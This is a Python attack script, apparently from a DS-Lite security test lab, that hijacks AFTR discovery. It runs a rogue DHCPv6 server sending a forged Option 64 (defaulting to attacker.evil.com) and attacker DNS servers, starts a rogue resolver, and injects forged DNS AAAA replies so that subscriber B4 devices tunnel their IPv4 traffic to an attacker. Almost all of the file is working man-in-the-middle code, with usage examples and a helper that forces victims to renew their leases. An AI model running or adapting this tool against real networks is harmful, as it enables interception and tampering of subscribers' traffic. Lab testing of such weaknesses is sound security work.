#!/usr/bin/python
# T12 – AFTR Discovery Attacks
#
# B4 elements discover their AFTR address through:
#   a) DHCPv6 Option 64 (RFC 6334) – no cryptographic verification
#   b) DNS resolution of AFTR FQDN – also unauthenticated
#
# RFC 6334 explicitly warns:
#   "there is no basis for trusting DS-Lite configuration received via DHCPv6"
#
# Attack modes:
#   dhcp  – Rogue DHCPv6 server: respond to B4 SOLICIT/REQUEST with a forged
#            Option 64 pointing to an attacker-controlled AFTR.
#            B4 will build its DS-Lite tunnel to the fake AFTR instead of the
#            legitimate one → all subscriber traffic flows to attacker.
#
#   dns   – DNS poisoning for AFTR FQDN: inject a forged DNS response for
#            'aftr.dslite.example.com' resolving to attacker's IPv6.
#            This tool works on-path (sniff real DNS query, inject forged reply).
#            Combined with dns_cache_poison.py for off-path scenarios.
#
#   race  – Race both methods simultaneously for maximum reliability.
#
# Attacker position: ISP network (2001:db8:cafe::/64)
#
# Usage:
#   python3 dhcpv6_hijack.py dhcp --interface eth-isp \
#       --attacker-ip6 2001:db8:cafe::150 \
#       --fake-aftr-ip6 2001:db8:cafe::150 \
#       --fake-aftr-fqdn attacker.evil.com.
#
#   python3 dhcpv6_hijack.py dns --interface eth-isp \
#       --attacker-ip6 2001:db8:cafe::150 \
#       --target-fqdn aftr.dslite.example.com \
#       --fake-ip6 2001:db8:cafe::150
import argparse
import random
import signal
import socket
import struct
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
import threading
import time

def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt()
signal.signal(signal.SIGTERM, _sigterm_handler)

from scapy.layers.dhcp6 import (
    DHCP6_Solicit, DHCP6_Advertise, DHCP6_Request, DHCP6_Reply,
    DHCP6OptClientId, DHCP6OptServerId, DHCP6OptOptReq,
    DHCP6OptDNSDomains,
)
try:
    from scapy.layers.dhcp6 import DHCP6_InfoRequest as DHCP6_Inf_req
except ImportError:
    DHCP6_Inf_req = None  # Not used directly, we parse raw msg_type
from scapy.layers.inet6 import IPv6, UDP as IPv6UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

from validate_parameters import is_valid_ipv6

stop_event = threading.Event()
served_count = 0
banner_attack_id = "T12"
served_lock = threading.Lock()


# ── DHCPv6 option 64 encoding ─────────────────────────────────────────────

def encode_fqdn(fqdn):
    """Encode FQDN as DNS wire format (for DHCP option 64)."""
    result = b''
    if not fqdn.endswith('.'):
        fqdn += '.'
    for label in fqdn.split('.'):
        if label:
            result += bytes([len(label)]) + label.encode()
    result += b'\x00'
    return result


def build_dhcpv6_option64(fqdn):
    """Build DHCPv6 Option 64 (AFTR-Name) raw bytes."""
    # Option type = 64, length = len(fqdn_wire), value = wire-format FQDN
    fqdn_wire = encode_fqdn(fqdn)
    return struct.pack('!HH', 64, len(fqdn_wire)) + fqdn_wire


def build_ia_addr_suboption(addr_bytes, preferred=604800, valid=2592000):
    """Build IA_ADDR sub-option (type 5) for use inside IA_NA."""
    # Option 5: 16-byte IPv6 addr + preferred lifetime + valid lifetime
    value = addr_bytes + struct.pack('!II', preferred, valid)
    return struct.pack('!HH', 5, len(value)) + value


def build_ia_na_option(ia_na_raw, offer_addr=None):
    """
    Build an IA_NA option (type 3) echoing the client's IAID.

    If the client included an IA_ADDR hint, echo it back.  Otherwise
    generate one from *offer_addr* (a 16-byte packed IPv6) or from the
    2001:db8:cafe::/64 prefix with a random suffix.
    """
    if ia_na_raw is None or len(ia_na_raw) < 12:
        return b''

    iaid = ia_na_raw[:4]       # 4 bytes IAID

    # Check if the client included IA_ADDR sub-options
    sub_opts = ia_na_raw[12:]
    has_ia_addr = False
    off = 0
    while off + 4 <= len(sub_opts):
        sopt = struct.unpack('!H', sub_opts[off:off+2])[0]
        slen = struct.unpack('!H', sub_opts[off+2:off+4])[0]
        if sopt == 5:  # IA_ADDR
            has_ia_addr = True
            break
        off += 4 + slen

    if has_ia_addr:
        # Echo the client's sub-options as-is
        ia_na_value = iaid + struct.pack('!II', 0, 0) + sub_opts
    else:
        # Generate an address to offer.  Use the provided address or
        # pick a random one from 2001:db8:cafe::/64.
        if offer_addr is None:
            suffix = random.randint(0x1000, 0xFFFF)
            offer_addr = socket.inet_pton(
                socket.AF_INET6, f'2001:db8:cafe::{suffix:x}')
        ia_addr = build_ia_addr_suboption(offer_addr)
        ia_na_value = iaid + struct.pack('!II', 0, 0) + ia_addr

    return struct.pack('!HH', 3, len(ia_na_value)) + ia_na_value


def build_dhcpv6_advertise(tx_id, client_duid, server_duid, aftr_fqdn,
                            dns_servers_ip6=None, ia_na_raw=None):
    """
    Build a DHCPv6 ADVERTISE message with:
    - Option 3 (IA_NA) echoed from client
    - Option 23 (DNS servers)
    - Option 64 (AFTR-Name) with fake AFTR FQDN
    - Option 7 (Preference = 255)
    """
    # Message type = 2 (ADVERTISE), 3-byte transaction ID
    msg = struct.pack('!B3s', 2, tx_id)

    # Option 1: Client DUID
    msg += struct.pack('!HH', 1, len(client_duid)) + client_duid

    # Option 2: Server DUID
    msg += struct.pack('!HH', 2, len(server_duid)) + server_duid

    # Option 3: IA_NA (echo client's IAID and requested address)
    msg += build_ia_na_option(ia_na_raw)

    # Option 23: DNS Recursive Name Servers (our fake server)
    if dns_servers_ip6:
        dns_bytes = b''
        for ip6 in dns_servers_ip6:
            try:
                dns_bytes += socket.inet_pton(socket.AF_INET6, ip6)
            except Exception:
                pass
        if dns_bytes:
            msg += struct.pack('!HH', 23, len(dns_bytes)) + dns_bytes

    # Option 64: AFTR-Name
    opt64 = build_dhcpv6_option64(aftr_fqdn)
    msg += opt64

    # Option 7: Preference (255 = highest priority)
    msg += struct.pack('!HHB', 7, 1, 255)

    return msg


def build_dhcpv6_reply(tx_id, client_duid, server_duid, aftr_fqdn,
                        dns_servers_ip6=None, ia_na_raw=None):
    """Build a DHCPv6 REPLY message."""
    msg = struct.pack('!B3s', 7, tx_id)  # type=7 REPLY

    msg += struct.pack('!HH', 1, len(client_duid)) + client_duid
    msg += struct.pack('!HH', 2, len(server_duid)) + server_duid

    # Option 3: IA_NA (echo client's request)
    msg += build_ia_na_option(ia_na_raw)

    if dns_servers_ip6:
        dns_bytes = b''
        for ip6 in dns_servers_ip6:
            try:
                dns_bytes += socket.inet_pton(socket.AF_INET6, ip6)
            except Exception:
                pass
        if dns_bytes:
            msg += struct.pack('!HH', 23, len(dns_bytes)) + dns_bytes

    opt64 = build_dhcpv6_option64(aftr_fqdn)
    msg += opt64

    return msg


# ── DHCPv6 rogue server ───────────────────────────────────────────────────

def dhcpv6_packet_handler(pkt, args, server_duid):
    """Handle DHCPv6 Solicit/Request packets, respond with fake Option 64."""
    global served_count

    if not pkt.haslayer('IPv6') or not pkt.haslayer('UDP'):
        return

    ipv6 = pkt['IPv6']
    udp = pkt['UDP']

    if udp.dport != 547:  # DHCPv6 server port
        return

    raw_payload = bytes(udp.payload)
    if len(raw_payload) < 4:
        return

    msg_type = raw_payload[0]
    tx_id = raw_payload[1:4]

    # Parse Client DUID, Server DUID and IA_NA from options
    client_duid = b'\x00\x01\x00\x01' + b'\xff' * 6  # fallback
    ia_na_raw = None
    req_server_duid = None   # Server-Identifier (opt 2) named in a REQUEST

    offset = 4
    while offset + 4 <= len(raw_payload):
        opt_code = struct.unpack('!H', raw_payload[offset:offset+2])[0]
        opt_len  = struct.unpack('!H', raw_payload[offset+2:offset+4])[0]
        opt_val  = raw_payload[offset+4:offset+4+opt_len]
        if opt_code == 1:    # Client DUID
            client_duid = opt_val
        elif opt_code == 2:  # Server DUID (present in REQUEST/RENEW)
            req_server_duid = opt_val
        elif opt_code == 3:  # IA_NA
            ia_na_raw = opt_val
        offset += 4 + opt_len

    src_ip6 = ipv6.src

    # Respond to SOLICIT (1) with ADVERTISE, or REQUEST/INF-REQ (3/11) with REPLY
    if msg_type == 1:   # SOLICIT → ADVERTISE
        dhcpv6_payload = build_dhcpv6_advertise(
            tx_id, client_duid, server_duid,
            args.fake_aftr_fqdn,
            dns_servers_ip6=[args.attacker_ip6],
            ia_na_raw=ia_na_raw,
        )
        dst_ip6 = src_ip6  # Unicast back to client
        print(f"  [+] SOLICIT from {src_ip6} → sending ADVERTISE "
              f"(fake AFTR: {args.fake_aftr_fqdn})")

    elif msg_type in (3, 11):  # REQUEST or INF-REQ → REPLY
        # RFC 8415 §18.3.1/§18.3.5: a server MUST only respond to a REQUEST whose
        # Server-Identifier names ITS OWN DUID. A REQUEST is the client committing
        # to one chosen server; if the client picked someone else, we stay silent.
        # (INFORMATION-REQUEST, msg 11, carries no Server-ID and is answered.)
        if msg_type == 3 and req_server_duid is not None \
                and req_server_duid != server_duid:
            return   # the client chose a DIFFERENT server (e.g. the real one)
        dhcpv6_payload = build_dhcpv6_reply(
            tx_id, client_duid, server_duid,
            args.fake_aftr_fqdn,
            dns_servers_ip6=[args.attacker_ip6],
            ia_na_raw=ia_na_raw,
        )
        dst_ip6 = src_ip6
        print(f"  [+] REQUEST from {src_ip6} (names our DUID) → sending REPLY "
              f"(fake AFTR: {args.fake_aftr_fqdn})")
    else:
        return

    # Build and send response.  DHCPv6 replies go to the client's
    # link-local address on port 546.  For link-local destinations,
    # Scapy warns "No route found" and may fail to auto-fill the
    # source MAC.  We read the interface MAC explicitly, build the
    # full frame with correct Ethernet header, and send via a raw
    # AF_PACKET socket to bypass Scapy's routing entirely.

    # Read our own MAC address
    try:
        with open(f'/sys/class/net/{args.interface}/address') as f:
            src_mac = f.read().strip()
    except Exception:
        src_mac = "00:00:00:00:00:00"

    # Build the Scapy packet with explicit MACs so bytes() never
    # needs to do a route lookup.
    resp = (
        Ether(src=src_mac, dst=pkt[Ether].src) /
        IPv6(src=args.attacker_ip6, dst=dst_ip6) /
        IPv6UDP(sport=547, dport=546) /
        dhcpv6_payload
    )

    try:
        raw_frame = bytes(resp)
        raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        raw_sock.bind((args.interface, 0))
        raw_sock.send(raw_frame)
        raw_sock.close()
        with served_lock:
            served_count += 1
    except Exception as e:
        print(f"  [!] Send error: {e}")


def run_rogue_dns(bind_ip6, fake_ip6, stop_evt):
    """Minimal rogue resolver for the AFTR-name redirect.

    The rogue DHCPv6 ADVERTISE/REPLY also hands the victim B4 the attacker
    as its DNS server (Option 23). The B4's dhclient exit hook then resolves
    the advertised AFTR FQDN through THIS server, so we answer every AAAA
    query with `fake_ip6` — the attacker's softwire endpoint. The B4 rebuilds
    its DS-Lite tunnel with remote=fake_ip6, i.e. straight to the attacker.
    """
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((bind_ip6, 53))
        s.settimeout(1.0)
    except Exception as e:
        print(f"[!] rogue DNS bind failed on [{bind_ip6}]:53 — {e}")
        return
    rdata = socket.inet_pton(socket.AF_INET6, fake_ip6)
    print(f"[*] rogue DNS up on [{bind_ip6}]:53 — AAAA * → {fake_ip6}")
    while not stop_evt.is_set():
        try:
            data, addr = s.recvfrom(1500)
        except socket.timeout:
            continue
        except Exception:
            break
        if len(data) < 12:
            continue
        # Walk past the QNAME to copy the question section verbatim.
        i = 12
        try:
            while i < len(data) and data[i] != 0:
                i += 1 + data[i]
            qend = i + 1 + 4  # null label + QTYPE + QCLASS
            question = data[12:qend]
        except Exception:
            continue
        header = (data[:2] + b'\x84\x00'        # QR=1, AA=1
                  + b'\x00\x01' + b'\x00\x01'    # QDCOUNT=1, ANCOUNT=1
                  + b'\x00\x00' + b'\x00\x00')   # NSCOUNT=0, ARCOUNT=0
        answer = b'\xc0\x0c' + struct.pack('!HHIH', 28, 1, 60, 16) + rdata
        try:
            s.sendto(header + question + answer, addr)
        except Exception:
            pass
    try:
        s.close()
    except Exception:
        pass


def run_dhcp_hijack(args):
    """T12: Rogue DHCPv6 server injecting fake Option 64 (AFTR-name hijack)."""
    print(f"[*] T12 – DHCPv6 AFTR Discovery Hijack")
    print(f"[*] Attacker IPv6:  {args.attacker_ip6}")
    print(f"[*] Fake AFTR FQDN: {args.fake_aftr_fqdn}")
    if hasattr(args, 'fake_aftr_ip6') and args.fake_aftr_ip6:
        print(f"[*] Fake AFTR IPv6: {args.fake_aftr_ip6}")
    print()
    print("[*] Waiting for B4 DHCPv6 SOLICIT/REQUEST on ISP segment...")
    print("[!] All B4s that renew DHCP leases will receive the fake AFTR address")
    print("[!] Subscriber traffic will be tunneled to attacker, not legitimate AFTR")
    print()

    # RFC 8415 §11.2 — Server DUID DUID-LLT (DUID Type 1: Link-layer + Time).
    #   uint16 DUID_TYPE=1 | uint16 hw_type=1 (Ethernet) | uint32 time |
    #   var-len link-layer address (6 bytes for Ethernet).
    # The MAC must be a real interface MAC; we use a locally-administered
    # unicast address (low byte of first octet: u=0 unicast, l=1 local).
    rand_mac = bytes([random.randint(0, 255) | 0x02 & ~0x01] +
                     [random.randint(0, 255) for _ in range(5)])
    server_duid = struct.pack('!HHI', 1, 1, int(time.time())) + rand_mac

    handler = lambda pkt: dhcpv6_packet_handler(pkt, args, server_duid)

    # Redirect mode: when a fake AFTR IPv6 is given, also run a rogue resolver
    # so the AFTR FQDN we advertise resolves to the attacker. With the rogue
    # DNS handed to the victim via Option 23, the B4 rebuilds its softwire with
    # remote=fake_aftr_ip6 — a full data-plane redirect, not just a name change.
    if getattr(args, 'fake_aftr_ip6', None):
        # Bring up the fake-AFTR endpoint on the attacker interface so the
        # redirected softwire actually lands on the attacker (otherwise the
        # B4 tunnels to an address nobody answers for).
        import subprocess as _sp
        _sp.run(["ip", "-6", "addr", "add", f"{args.fake_aftr_ip6}/64",
                 "dev", args.interface], check=False, capture_output=True)
        threading.Thread(
            target=run_rogue_dns,
            args=(args.attacker_ip6, args.fake_aftr_ip6, stop_event),
            daemon=True,
        ).start()
        print(f"[!] REDIRECT MODE: {args.fake_aftr_fqdn} → {args.fake_aftr_ip6} "
              f"(victim B4 will tunnel its IPv4 traffic to the attacker)")

    # Explicitly join the DHCPv6 servers+relays multicast group (ff02::1:2).
    # Without this, the bridge's multicast forwarding may not propagate the
    # SOLICIT to the attacker port even with `multicast_snooping=0`, because
    # Linux bridges require an active MLD-report or an outbound multicast
    # join on the port before flooding that group. We use a throwaway
    # socket bound to UDP/547 joined to ff02::1:2 — the kernel sends the
    # MLD report, the bridge installs a forwarding entry, and scapy's
    # subsequent sniff() sees the SOLICITs.
    _mcast_sock = None
    try:
        import socket as _s, struct as _st
        _mcast_sock = _s.socket(_s.AF_INET6, _s.SOCK_DGRAM)
        _mcast_sock.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
        _mcast_sock.bind(("", 547))
        # Find interface index
        iface_idx = 0
        try:
            with open("/proc/net/if_inet6") as fh:
                for line in fh:
                    parts = line.split()
                    if len(parts) >= 6 and parts[5] == args.interface:
                        iface_idx = int(parts[1], 16)
                        break
        except Exception:
            pass
        if iface_idx:
            mreq = _s.inet_pton(_s.AF_INET6, "ff02::1:2") + _st.pack("I", iface_idx)
            # IPV6_JOIN_GROUP = 20 on Linux
            _mcast_sock.setsockopt(41, 20, mreq)
            print(f"[*] Joined ff02::1:2 on {args.interface} (idx={iface_idx}) "
                  "to attract bridged DHCPv6 multicast")
    except Exception as _e:
        print(f"[!] multicast-group join failed: {_e} (attack may still work)")

    try:
        # Bounded listen so the function returns on its own (and the post-listen
        # data-path re-assert in main() runs) instead of blocking in sniff()
        # until an external `timeout` SIGTERMs the process. The auto-trigger
        # forces the victim SOLICIT at ~t+2s, so a window of a few seconds is
        # ample to catch and answer it.
        sniff(
            iface=args.interface,
            filter='udp and port 547',
            prn=handler,
            store=False,
            timeout=getattr(args, "listen_secs", 8),
            stop_filter=lambda _: stop_event.is_set()
        )
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        if _mcast_sock is not None:
            try: _mcast_sock.close()
            except Exception: pass

    print(f"\n[+] Served {served_count} fake DHCPv6 responses")


# ── DNS FQDN hijack ───────────────────────────────────────────────────────

def build_dns_aaaa_response(query_data, fake_ip6):
    """Build a forged DNS AAAA response."""
    if len(query_data) < 12:
        return None

    txid = query_data[:2]
    # Flags: QR=1, AA=1, RD=1, RA=1, RCODE=0
    flags = struct.pack('!H', 0x8580)
    qdcount = struct.pack('!H', 1)
    ancount = struct.pack('!H', 1)
    nscount = struct.pack('!H', 0)
    arcount = struct.pack('!H', 0)

    header = txid + flags + qdcount + ancount + nscount + arcount
    # Copy question section from query
    question = query_data[12:]

    # Answer: pointer to question name (0xC00C), type=AAAA(28),
    # class=IN(1), TTL=300, rdlength=16
    answer = struct.pack('!HHHIH', 0xC00C, 28, 1, 300, 16)
    try:
        answer += socket.inet_pton(socket.AF_INET6, fake_ip6)
    except Exception:
        return None

    return header + question + answer


def dns_packet_handler(pkt, args):
    """Sniff DNS queries for AFTR FQDN, inject forged AAAA response."""
    if not pkt.haslayer('IPv6') or not pkt.haslayer('UDP'):
        return

    udp = pkt['UDP']
    if udp.dport != 53:
        return

    raw_payload = bytes(udp.payload)
    if len(raw_payload) < 12:
        return

    # Check if this is a query (QR=0)
    flags = struct.unpack('!H', raw_payload[2:4])[0]
    if flags & 0x8000:
        return  # it's a response, not a query

    # Decode question to check if it's for our target FQDN
    qname_bytes = raw_payload[12:]
    labels = []
    offset = 0
    while offset < len(qname_bytes):
        length = qname_bytes[offset]
        if length == 0:
            break
        offset += 1
        labels.append(qname_bytes[offset:offset+length].decode(errors='replace'))
        offset += length
    qname = '.'.join(labels).lower()

    target = args.target_fqdn.rstrip('.').lower()
    if target not in qname and qname not in target:
        return

    qtype_offset = offset + 1  # skip null label
    if qtype_offset + 2 <= len(qname_bytes):
        qtype = struct.unpack('!H', qname_bytes[qtype_offset:qtype_offset+2])[0]
        if qtype not in (28, 255):  # AAAA or ANY
            return

    src_ip6 = pkt['IPv6'].src
    print(f"  [*] DNS query for '{qname}' from {src_ip6} → injecting forged AAAA")

    forged = build_dns_aaaa_response(raw_payload, args.fake_ip6)
    if not forged:
        return

    # Read our own MAC for the Ethernet source
    try:
        with open(f'/sys/class/net/{args.interface}/address') as f:
            src_mac = f.read().strip()
    except Exception:
        src_mac = "00:00:00:00:00:00"

    resp = (
        Ether(src=src_mac, dst=pkt[Ether].src) /
        IPv6(src=pkt['IPv6'].dst, dst=src_ip6) /
        IPv6UDP(sport=53, dport=udp.sport) /
        forged
    )
    try:
        raw_frame = bytes(resp)
        raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
        raw_sock.bind((args.interface, 0))
        raw_sock.send(raw_frame)
        raw_sock.close()
        print(f"  [+] Forged AAAA response sent: {args.target_fqdn} → {args.fake_ip6}")
    except Exception as e:
        print(f"  [!] Send error: {e}")


def run_dns_hijack(args):
    """T12: DNS AFTR FQDN poisoning (resolver-side AFTR hijack)."""
    print(f"[*] T12 – DNS AFTR FQDN Hijack (on-path)")
    print(f"[*] Watching for DNS AAAA queries for: {args.target_fqdn}")
    print(f"[*] Will respond with fake IPv6: {args.fake_ip6}")
    print()
    print("[*] Sniffing DNS traffic on ISP segment... Ctrl+C to stop.")
    print("[!] B4 devices querying for AFTR FQDN will receive forged IPv6")
    print("[!] B4 will establish tunnel to fake AFTR (attacker-controlled)")
    print()

    handler = lambda pkt: dns_packet_handler(pkt, args)
    try:
        sniff(
            iface=args.interface,
            filter='udp and port 53',
            prn=handler,
            store=False,
            stop_filter=lambda _: stop_event.is_set()
        )
    except KeyboardInterrupt:
        stop_event.set()



# ── main ──────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="T12 – AFTR Discovery Attacks (DHCPv6 Option 64 / DNS FQDN Hijacking)\n"
                    "Redirects B4 CPE tunnel setup to attacker-controlled AFTR.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack scenario:
  1. Attacker on ISP segment responds faster than legitimate DHCPv6 server
  2. B4 receives Option 64 with attacker's AFTR FQDN instead of real AFTR
  3. B4 resolves fake FQDN → attacker's IPv6
  4. B4 establishes DS-Lite tunnel to attacker
  5. ALL subscriber IPv4 traffic flows through attacker's 'AFTR'
  6. Attacker can inspect, modify, or drop all subscriber traffic

Examples:
  # DHCPv6 hijack (rogue DHCPv6 server on ISP):
  python3 dhcpv6_hijack.py dhcp \\
      --interface eth-isp \\
      --attacker-ip6 2001:db8:cafe::150 \\
      --fake-aftr-fqdn attacker.evil.com. \\
      --fake-aftr-ip6 2001:db8:cafe::150

  # DNS FQDN hijack (on-path, ISP segment):
  python3 dhcpv6_hijack.py dns \\
      --interface eth-isp \\
      --attacker-ip6 2001:db8:cafe::150 \\
      --target-fqdn aftr.dslite.example.com \\
      --fake-ip6 2001:db8:cafe::150

  # Trigger B4 DHCPv6 renewal to test (run from B4 namespace):
  dhclient -6 -r eth-isp && sleep 1 && dhclient -6 eth-isp
"""
    )
    sub = p.add_subparsers(dest='mode', required=True)

    dp = sub.add_parser('dhcp', help='T12: Rogue DHCPv6 server with fake Option 64 (AFTR-name hijack)')
    dp.add_argument('--interface', required=True, help='ISP interface (eth-isp)')
    dp.add_argument('--attacker-ip6', required=True, help="Attacker's IPv6 on ISP")
    dp.add_argument('--fake-aftr-fqdn', default='attacker.evil.com.',
                    help='Fake AFTR FQDN to advertise in Option 64')
    dp.add_argument('--fake-aftr-ip6',
                    help='Attacker softwire endpoint. Enables the full '
                         'data-plane redirect: a rogue DNS is started that '
                         'resolves the advertised AFTR FQDN to this address, '
                         'this address is brought up on the attack interface, '
                         "and the victim B4 rebuilds its tunnel here so the "
                         "attacker intercepts the subscriber's IPv4 traffic.")
    dp.add_argument('--attack-id', default='T12',
                    help='Corpus ID to tag results with')
    dp.add_argument('--auto-trigger-victim', metavar='NS',
                    help='After listener is armed, force the named B4 netns '
                         '(e.g. b4-1) to re-issue DHCPv6 SOLICIT so the rogue '
                         'reply is consumed. Without this, the attack waits '
                         'silently for an organic SOLICIT.')

    dnsp = sub.add_parser('dns', help='T12: DNS FQDN poisoning for AFTR resolution')
    dnsp.add_argument('--interface', required=True, help='ISP interface (eth-isp)')
    dnsp.add_argument('--attacker-ip6', required=True, help="Attacker's IPv6 on ISP")
    dnsp.add_argument('--target-fqdn', default='aftr.dslite.example.com',
                      help='AFTR FQDN to hijack (default: aftr.dslite.example.com)')
    dnsp.add_argument('--fake-ip6', required=True,
                      help="Fake AFTR IPv6 to inject in DNS response")

    args = p.parse_args()
    global banner_attack_id
    banner_attack_id = getattr(args, "attack_id", "T12") or "T12"

    if not is_valid_ipv6(args.attacker_ip6):
        p.error(f'Invalid attacker-ip6: {args.attacker_ip6}')

    if args.mode == 'dhcp':
        # Companion-process: force a victim B4 to re-issue DHCPv6 SOLICIT
        # so the rogue server response is consumed during this run.
        if getattr(args, "auto_trigger_victim", None):
            import subprocess, threading
            def _trigger_renew():
                time.sleep(2.0)  # let the rogue listener arm first
                ns = args.auto_trigger_victim
                print(f"[*] auto-trigger: forcing {ns} dhclient renewal")
                cfg = f"/etc/dhcp/dhclient6-{ns}.conf"
                pf  = f"/var/run/dhclient6-{ns}.pid"
                lf  = f"/var/lib/dhcp/dhclient6-{ns}.leases"
                # Kill only THIS ns's dhclient via its pidfile. The container
                # shares one PID namespace, so a blanket `pkill -x dhclient`
                # would also kill other B4s' clients; target the pidfile so we
                # disturb only the victim. (Use dhclient -x release as well.)
                try:
                    with open(pf) as _fh:
                        _pid = _fh.read().strip()
                    if _pid:
                        subprocess.run(["kill", _pid],
                                       check=False, capture_output=True)
                except OSError:
                    pass
                time.sleep(0.6)
                # Use the same config/lease/pid paths as setup.sh so the
                # standard dhclient-script + /etc/dhcp/dhclient-exit-hooks.d
                # chain runs and the DS-Lite tunnel-rebuild hook fires on BOUND.
                # Delete pid AND lease so dhclient solicits fresh instead of
                # unicast-renewing to the legitimate server (which would bypass
                # the rogue listener on the broadcast path).
                subprocess.run(["rm", "-f", pf, lf], capture_output=True)
                subprocess.run(
                    ["ip", "netns", "exec", ns, "dhclient", "-6", "-1", "-nw",
                     "-cf", cfg, "-lf", lf, "-pf", pf, "eth-isp"],
                    check=False, capture_output=True, timeout=10,
                )
                # The DHCPv6 renewal flushes IA_NA addresses and can drop the
                # static softwire-local address setup.sh pins (::b41 for b4-1,
                # ::b42 for b4-2), which silently breaks the victim's data path
                # even when the hijack does not win the race. Re-assert it so a
                # failed hijack leaves the lab usable rather than half-broken.
                time.sleep(2.0)
                sw_local = f"2001:db8:cafe::{ns.replace('-', '')}/64"
                subprocess.run(
                    ["ip", "netns", "exec", ns, "ip", "-6", "addr", "add",
                     sw_local, "dev", "eth-isp"],
                    check=False, capture_output=True,
                )
            _renew_thr = threading.Thread(target=_trigger_renew, daemon=True)
            _renew_thr.start()
        run_dhcp_hijack(args)
        # Deterministically re-assert the static softwire-local address after the
        # listen completes. The renewal trigger above runs in a daemon thread that
        # the interpreter may kill on exit before its own best-effort re-add runs,
        # which would leave the victim B4 without ::b4N and silently break the data
        # path. Joining the thread and re-adding here on the main path guarantees a
        # failed-or-finished hijack always leaves the lab usable.
        if getattr(args, "auto_trigger_victim", None):
            import subprocess
            _renew_thr.join(timeout=8)
            _ns = args.auto_trigger_victim
            _sw_local = f"2001:db8:cafe::{_ns.replace('-', '')}/64"
            subprocess.run(
                ["ip", "netns", "exec", _ns, "ip", "-6", "addr", "add",
                 _sw_local, "dev", "eth-isp"],
                check=False, capture_output=True)
    else:
        if not is_valid_ipv6(args.fake_ip6):
            p.error(f'Invalid fake-ip6: {args.fake_ip6}')
        run_dns_hijack(args)



if __name__ == '__main__':
    main()
